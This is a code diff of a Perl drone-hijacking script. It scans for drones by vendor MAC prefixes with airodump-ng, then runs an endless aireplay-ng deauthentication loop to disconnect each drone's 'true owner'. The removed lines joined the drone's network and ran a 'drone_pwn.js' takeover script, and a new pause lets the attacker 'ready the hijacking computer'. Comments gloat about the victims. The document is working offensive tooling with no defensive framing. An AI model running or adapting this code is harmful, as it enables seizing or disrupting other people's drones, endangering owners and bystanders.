@@ -18,21 +18,15 @@ my @drone_macs = qw/90:03:B7 A0:14:3D 00:12:1C 00:26:7E/;
 
 use strict;
 
-my $interface  = shift || "wlan1";
-my $interface2 = shift || "wlan0";
-
-# the JS to control our drone
-my $controljs  = shift || "drone_control/drone_pwn.js";
+my $interface  = shift || "wlan0";
 
 # paths to applications
-my $dhclient	= "dhclient";
 my $iwconfig	= "iwconfig";
 my $ifconfig	= "ifconfig";
 my $airmon	= "airmon-ng";
 my $aireplay	= "aireplay-ng";
 my $aircrack	= "aircrack-ng";
 my $airodump	= "airodump-ng";
-my $nodejs	= "nodejs";
 
 
 # put device into monitor mode
@@ -43,7 +37,10 @@ sudo($ifconfig, $interface, "down");
 my $tmpfile = "/tmp/dronestrike";
 my %skyjacked;
 
-while (1)
+my %clients;
+my %chans;
+
+while (!%clients)
 {
 
 		# show user APs
@@ -52,8 +49,8 @@ while (1)
 			my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
 			print "pid $pid\n";
 
-			# wait 5 seconds then kill
-			sleep 2;
+			# wait 10 seconds then kill
+			sleep 10;
 			print DUMP "\cC";
 			sleep 1;
 			sudo("kill", $pid);
@@ -69,8 +66,6 @@ while (1)
 
 		sleep 4;
 		# read in APs
-		my %clients;
-		my %chans;
 		foreach my $tmpfile1 (glob("$tmpfile*.csv"))
 		{
 				open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
@@ -101,6 +96,13 @@ while (1)
 				#unlink($tmpfile1);
 		}
 		print "\n\n";
+}
+
+# Give us some time so we can ready the hijacking computer
+print "Entering deauth loop in 3 seconds...";
+sleep 3;
+
+while (1) {
 
 		foreach my $cli (keys %clients)
 		{
@@ -117,33 +119,15 @@ while (1)
 			# now, disconnect the TRUE owner of the drone.
 			# sucker.
 			print "Disconnecting the true owner of the drone ;)\n\n";
-			sudo($aireplay, "-0", "3", "-a", $clients{$cli}, "-c", $cli, $interface);
+			sudo($aireplay, "-0", "32", "-a", $clients{$cli}, "-c", $cli, $interface);
 
 		}	
-
-		sleep(2);
 
 		# go into managed mode
 		#sudo($airmon, "stop", $interface);
 
-		# connect to each drone and run our zombie client!
-		foreach my $drone (keys %chans)
-		{
-			# ignore drones we've skyjacked before -- thanks to @daviottenheimer for bug discovery!
-			next if $skyjacked{$chans{$drone}[1]}++;
 
-			print "\n\nConnecting to drone $chans{$drone}[1] ($drone)\n";
-			sudo($iwconfig, $interface2, "essid", $chans{$drone}[1]);
-
-			print "Acquiring IP from drone for hostile takeover\n";
-			sudo($dhclient, "-v", $interface2);
-
-			print "\n\nTAKING OVER DRONE\n";
-			sudo($nodejs, $controljs);
-				
-		}
-
-	sleep 5;
+	sleep 2;
 }
 
 	
